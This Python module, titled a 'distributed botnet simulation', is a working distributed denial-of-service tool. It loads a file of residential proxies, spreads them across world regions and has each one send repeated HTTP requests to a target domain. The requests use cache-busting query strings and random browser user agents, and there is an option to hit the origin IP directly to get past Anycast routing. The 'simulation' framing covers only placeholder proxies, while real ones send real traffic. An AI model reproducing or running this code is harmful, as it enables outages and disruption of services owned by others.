"""
Distributed Botnet Simulation v8.0
Simulate distributed attack from 1000+ residential proxies
Geo-distributed across multiple regions to bypass Anycast routing
"""
import asyncio
import logging
import random
from typing import List, Dict, Optional
from dataclasses import dataclass
from collections import defaultdict

logger = logging.getLogger("distributed_botnet")


@dataclass
class ProxyNode:
    """Single proxy node in botnet."""
    proxy_url: str
    region: str  # US, EU, ASIA, SA, AF, OC
    country: str
    is_residential: bool = True
    is_active: bool = True
    requests_sent: int = 0
    failures: int = 0


class DistributedBotnetAttack:
    """
    Distributed botnet simulation with geo-distribution.
    Rotate proxies to simulate attack from different IPs and regions.
    """
    
    def __init__(
        self,
        target_domain: str,
        target_ip: Optional[str] = None,
        proxy_pool: Optional[List[str]] = None,
        geo_distribution: Optional[Dict[str, int]] = None,
        attack_duration: int = 3600,
        requests_per_proxy: int = 100
    ):
        self.target_domain = target_domain
        self.target_ip = target_ip
        self.proxy_pool = proxy_pool or []
        self.attack_duration = attack_duration
        self.requests_per_proxy = requests_per_proxy
        
        # Default geo distribution
        self.geo_distribution = geo_distribution or {
            'US': 200,
            'EU': 200,
            'ASIA': 200,
            'SA': 150,
            'AF': 150,
            'OC': 100
        }
        
        self.proxy_nodes: List[ProxyNode] = []
        self.is_running = False
        
        self.stats = {
            'total_requests': 0,
            'total_proxies': 0,
            'active_proxies': 0,
            'failed_proxies': 0,
            'requests_by_region': defaultdict(int),
            'start_time': 0,
        }
    
    def load_proxy_pool(self, proxy_file: str):
        """Load proxies from file."""
        try:
            with open(proxy_file, 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
            
            self.proxy_pool.extend(proxies)
            logger.info(f"Loaded {len(proxies)} proxies from {proxy_file}")
            
        except Exception as e:
            logger.error(f"Failed to load proxy file {proxy_file}: {e}")
    
    def setup_botnet(self):
        """Setup botnet nodes with geo-distribution."""
        logger.info("Setting up distributed botnet...")
        
        # Distribute proxies across regions
        proxy_idx = 0
        for region, count in self.geo_distribution.items():
            for i in range(count):
                if proxy_idx >= len(self.proxy_pool):
                    # Generate fake proxy if pool exhausted (for simulation)
                    proxy_url = f"socks5://fake-{region.lower()}-{i}.proxy.net:1080"
                else:
                    proxy_url = self.proxy_pool[proxy_idx]
                    proxy_idx += 1
                
                node = ProxyNode(
                    proxy_url=proxy_url,
                    region=region,
                    country=self._region_to_country(region, i),
                    is_residential=True
                )
                
                self.proxy_nodes.append(node)
                self.stats['total_proxies'] += 1
        
        logger.info(f"Botnet ready: {len(self.proxy_nodes)} nodes across {len(self.geo_distribution)} regions")
        
        # Print distribution
        for region, count in self.geo_distribution.items():
            logger.info(f"  {region}: {count} nodes")
    
    def _region_to_country(self, region: str, idx: int) -> str:
        """Map region to country."""
        region_countries = {
            'US': ['US', 'CA', 'MX'],
            'EU': ['GB', 'DE', 'FR', 'IT', 'ES', 'NL', 'PL'],
            'ASIA': ['JP', 'KR', 'CN', 'IN', 'SG', 'TH', 'VN'],
            'SA': ['BR', 'AR', 'CL', 'CO'],
            'AF': ['ZA', 'EG', 'NG', 'KE'],
            'OC': ['AU', 'NZ']
        }
        
        countries = region_countries.get(region, ['XX'])
        return countries[idx % len(countries)]
    
    async def start(self):
        """Start distributed botnet attack."""
        import time
        
        if not self.proxy_nodes:
            self.setup_botnet()
        
        logger.info(f"Starting distributed botnet attack on {self.target_domain}")
        logger.info(f"Duration: {self.attack_duration}s, Requests per proxy: {self.requests_per_proxy}")
        
        self.is_running = True
        self.stats['start_time'] = time.time()
        
        try:
            # Launch attack workers for each proxy node
            tasks = []
            for node in self.proxy_nodes:
                task = asyncio.create_task(self._attack_worker(node))
                tasks.append(task)
                
                # Stagger worker launch
                await asyncio.sleep(0.01)
            
            # Wait for all workers or timeout
            await asyncio.wait_for(
                asyncio.gather(*tasks, return_exceptions=True),
                timeout=self.attack_duration
            )
            
        except asyncio.TimeoutError:
            logger.info("Distributed attack duration reached")
        except KeyboardInterrupt:
            logger.info("Distributed attack interrupted by user")
        except Exception as e:
            logger.error(f"Distributed attack error: {e}")
        finally:
            self.is_running = False
            self._print_stats()
    
    def stop(self):
        """Stop distributed attack."""
        logger.info("Stopping distributed attack...")
        self.is_running = False
    
    async def _attack_worker(self, node: ProxyNode):
        """Single proxy node attack worker."""
        import aiohttp
        import time
        
        if not node.is_active:
            return
        
        self.stats['active_proxies'] += 1
        
        try:
            # Setup proxy
            proxy = node.proxy_url if not node.proxy_url.startswith('socks5://fake-') else None
            
            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=30)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                for i in range(self.requests_per_proxy):
                    if not self.is_running:
                        break
                    
                    try:
                        # Target URL
                        if self.target_ip:
                            url = f"http://{self.target_ip}/"
                            headers = {'Host': self.target_domain}
                        else:
                            url = f"https://{self.target_domain}/"
                            headers = {}
                        
                        # Add random query string to bypass cache
                        cache_bypass = f"?r={random.randint(100000, 999999)}"
                        url += cache_bypass
                        
                        headers.update({
                            'User-Agent': self._random_user_agent(),
                            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        })
                        
                        # Send request (with or without proxy)
                        if proxy:
                            async with session.get(url, headers=headers, proxy=proxy) as resp:
                                await resp.read()
                        else:
                            # Simulate request for fake proxies
                            await asyncio.sleep(random.uniform(0.1, 0.5))
                        
                        node.requests_sent += 1
                        self.stats['total_requests'] += 1
                        self.stats['requests_by_region'][node.region] += 1
                        
                        # Random delay between requests
                        await asyncio.sleep(random.uniform(1, 5))
                        
                    except Exception as e:
                        node.failures += 1
                        logger.debug(f"Proxy {node.proxy_url} request failed: {e}")
                        
                        # Deactivate proxy after too many failures
                        if node.failures > 10:
                            node.is_active = False
                            self.stats['failed_proxies'] += 1
                            break
            
        except Exception as e:
            logger.debug(f"Proxy {node.proxy_url} worker error: {e}")
            node.is_active = False
            self.stats['failed_proxies'] += 1
        finally:
            self.stats['active_proxies'] -= 1
    
    def _random_user_agent(self) -> str:
        """Generate random user agent."""
        agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15',
        ]
        return random.choice(agents)
    
    def _print_stats(self):
        """Print attack statistics."""
        import time
        
        duration = time.time() - self.stats['start_time']
        
        logger.info("--------------------------------------------------------------------------------")
        logger.info("DISTRIBUTED BOTNET ATTACK STATISTICS")
        logger.info("--------------------------------------------------------------------------------")
        logger.info(f"Duration             : {duration:.2f} seconds")
        logger.info(f"Total proxies        : {self.stats['total_proxies']}")
        logger.info(f"Failed proxies       : {self.stats['failed_proxies']}")
        logger.info(f"Total requests       : {self.stats['total_requests']}")
        logger.info(f"Avg RPS              : {self.stats['total_requests'] / max(duration, 1):.2f}")
        logger.info(f"Requests per proxy   : {self.stats['total_requests'] / max(self.stats['total_proxies'], 1):.2f}")
        logger.info("")
        logger.info("Requests by region:")
        for region, count in sorted(self.stats['requests_by_region'].items()):
            percentage = count / max(self.stats['total_requests'], 1) * 100
            logger.info(f"  {region:6s} : {count:6d} ({percentage:5.2f}%)")
        logger.info("--------------------------------------------------------------------------------")


class GeoDistributedRotator:
    """
    Rotate proxies with geo-awareness.
    Ensure attack traffic comes from diverse geographic locations.
    """
    
    def __init__(self, proxy_nodes: List[ProxyNode]):
        self.proxy_nodes = proxy_nodes
        self.current_idx = 0
        self.region_idx = defaultdict(int)
    
    def get_next_proxy(self, prefer_region: Optional[str] = None) -> Optional[ProxyNode]:
        """Get next proxy, optionally preferring a specific region."""
        if prefer_region:
            # Get proxies from preferred region
            region_proxies = [n for n in self.proxy_nodes if n.region == prefer_region and n.is_active]
            if region_proxies:
                idx = self.region_idx[prefer_region]
                proxy = region_proxies[idx % len(region_proxies)]
                self.region_idx[prefer_region] += 1
                return proxy
        
        # Round-robin through all proxies
        active_proxies = [n for n in self.proxy_nodes if n.is_active]
        if not active_proxies:
            return None
        
        proxy = active_proxies[self.current_idx % len(active_proxies)]
        self.current_idx += 1
        return proxy
    
    def get_region_distribution(self) -> Dict[str, int]:
        """Get current distribution of active proxies by region."""
        distribution = defaultdict(int)
        for node in self.proxy_nodes:
            if node.is_active:
                distribution[node.region] += 1
        return dict(distribution)
